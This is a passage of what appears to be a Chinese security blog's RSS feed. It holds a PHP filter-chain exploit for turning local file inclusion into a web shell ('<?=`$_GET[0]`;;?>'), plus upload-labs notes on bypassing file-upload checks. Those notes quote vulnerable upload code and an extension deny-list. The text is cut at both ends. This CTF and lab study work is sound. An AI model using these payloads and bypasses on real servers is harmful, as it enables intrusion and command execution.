&amp;#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$filters = &amp;quot;convert.base64-encode|&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# make sure to get rid of any equal signs in both the string we just generated and the rest of the file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$filters .= &amp;quot;convert.iconv.UTF8.UTF7|&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;foreach (str_split(strrev($base64_payload)) as $c) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $filters .= $conversions[$c] . &amp;quot;|&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $filters .= &amp;quot;convert.base64-decode|&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $filters .= &amp;quot;convert.base64-encode|&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $filters .= &amp;quot;convert.iconv.UTF8.UTF7|&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$filters .= &amp;quot;convert.base64-decode&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$final_payload = &amp;quot;php://filter/&amp;#123;$filters&amp;#125;/resource=data://,aaaaaaaaaaaaaaaaaaaa&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// echo $final_payload;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var_dump(file_get_contents($final_payload));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// hexdump&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 3c 3f 3d 60  |string(18) &amp;quot;&amp;lt;?=`|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 00000010  24 5f 47 45 54 5b 30 5d  60 3b 3b 3f 3e 18 22 0a  |$_GET[0]`;;?&amp;gt;.&amp;quot;.|&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;convert.iconv.UTF8.UTF7&lt;/code&gt;  将等号转换为字母。之所以使用这个的原因是 exp 作者遇到过有时候等号会让  &lt;code&gt;convert.base64-decode&lt;/code&gt;  过滤器解析失败的情况，可以使用 iconv 从 UTF8 转换到 UTF7 ，会把字符串中的任何等号变成一些 base64 。&lt;/p&gt;
&lt;p&gt;我们可以知道对于这种方法来说，其实文件内容并不重要，但至少得有内容，而且一般读取有内容的文件并不是大问题，所以我们可以简单尝试利用  &lt;code&gt;/etc/passwd&lt;/code&gt; :&lt;/p&gt;
&lt;p&gt;后面还有一些天书一样的解释，我实在…&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM5NS8=&#34;&gt;https://tttang.com/archive/1395/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;还有一种神仙解法，先挖坑～&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM4NC8=&#34;&gt;hxp CTF 2021 - A New Novel LFI - 跳跳糖 (tttang.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;实话实说，都是我做不出来的解法&lt;/p&gt;
&lt;p&gt;我也就做做 16 年的 ctf 罢了&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/04/16/Upload/</guid>
            <title>File upload</title>
            <link>http://example.com/2022/04/16/Upload/</link>
            <category>File upload</category>
            <pubDate>Sat, 16 Apr 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;upload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#upload&#34;&gt;#&lt;/a&gt; Upload&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被 webshell。&lt;/p&gt;
&lt;p&gt;所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：&lt;br&gt;
–验证文件类型、后缀名、大小；&lt;br&gt;
–验证文件的上传方式；&lt;br&gt;
–对文件进行一定复杂的重命名；&lt;br&gt;
–不要暴露文件上传后的路径；&lt;br&gt;
–等等…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;upload-labs&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#upload-labs&#34;&gt;#&lt;/a&gt; upload-labs&lt;/h2&gt;
&lt;p&gt;Pass01&lt;/p&gt;
&lt;p&gt;文件上传时先上传到临时目录，在从临时目录移动到定义的文件夹&lt;/p&gt;
&lt;p&gt;C:\Users\18310\AppData\local\temp  -&amp;gt;  ./uploads/xxx.php&lt;/p&gt;
&lt;p&gt;上传结束，临时文件删除&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$is_upload = false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$msg = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (isset($_POST[&amp;#x27;submit&amp;#x27;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (file_exists(UPLOAD_PATH)) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $temp_file = $_FILES[&amp;#x27;upload_file&amp;#x27;][&amp;#x27;tmp_name&amp;#x27;];   //&amp;#x27;upload_file&amp;#x27;是数组，通过[]取值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $img_path = UPLOAD_PATH . &amp;#x27;/&amp;#x27; . $_FILES[&amp;#x27;upload_file&amp;#x27;][&amp;#x27;name&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (move_uploaded_file($temp_file, $img_path))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $is_upload = true;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $msg = &amp;#x27;上传出错！&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $msg = UPLOAD_PATH . &amp;#x27;文件夹不存在,请手工创建！&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function checkFile() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var file = document.getElementsByName(&amp;#x27;upload_file&amp;#x27;)[0].value;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (file == null || file == &amp;quot;&amp;quot;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            alert(&amp;quot;请选择要上传的文件!&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //定义允许上传的文件类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var allow_ext = &amp;quot;.jpg|.png|.gif&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //提取上传文件的类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var ext_name = file.substring(file.lastIndexOf(&amp;quot;.&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //判断上传文件类型是否允许上传&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (allow_ext.indexOf(ext_name) == -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            var errMsg = &amp;quot;该文件不允许上传，请上传&amp;quot; + allow_ext + &amp;quot;类型的文件,当前文件类型为：&amp;quot; + ext_name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            alert(errMsg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;method 1. 抓包，上传后缀改为 jpg 的 php，抓包后修改后缀为 php&lt;/p&gt;
&lt;p&gt;method 2. 前端 JS 验证，浏览器关闭 js&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Pass02 检测 MIME&lt;/p&gt;
&lt;p&gt;BP 修改 Content-Type: image/jpeg（image/png，image/gif）&lt;/p&gt;
&lt;p&gt;利用 copy 和成木马图片&lt;/p&gt;
&lt;p&gt;copy xxxx.jpg /b + test.php /a test1.jpg&lt;/p&gt;
&lt;p&gt;Pass03&lt;/p&gt;
&lt;p&gt;通过上传 php3,php5,phtml 绕过&lt;/p&gt;
&lt;p&gt;上传 php3 需要在 Apache 配置文件中增加解析 php3,php5,phtml, 使 Apache 解析这些文件&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;title class_&#34;&gt;AddType&lt;/span&gt; text/html .&lt;span class=&#34;property&#34;&gt;shtml&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;AddoutputFilter&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;INCLUDES&lt;/span&gt; .&lt;span class=&#34;property&#34;&gt;shtml&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;AddType&lt;/span&gt; application/x-httpd-php .&lt;span class=&#34;property&#34;&gt;php&lt;/span&gt; .&lt;span class=&#34;property&#34;&gt;phtml&lt;/span&gt; .&lt;span class=&#34;property&#34;&gt;php3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;#asp 可以通过 asa 和 cer 绕过&lt;/p&gt;
&lt;p&gt;Pass04&lt;/p&gt;
&lt;p&gt;.htaccess 实现 php 伪静态&lt;/p&gt;
&lt;p&gt;.htaccess 文件夹内文件都会被当做 php 解析&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;SetHandler&lt;/span&gt; application/x-httpd-php   &lt;span class=&#34;comment&#34;&gt;//将目录下所有文件都作为php解析&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或使用 Apache 解析漏洞&lt;/p&gt;
&lt;p&gt;test.php.x&lt;/p&gt;
&lt;p&gt;预防：使用以下代码使得上传后无法解析&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/2759285/1641700272045-7fc11c94-5bb3-4087-a010-94cf9230bbf7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Pass-04 过滤代码&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (isset(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = array(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ini&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = deldot(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);//删除文件名末尾的点&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strrchr(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);//分割取后缀&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strtolower(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); //转换为小写&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = str_ireplace(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);//去除字符串::&lt;span class=&#34;variable&#34;&gt;$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); //收尾去空&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span 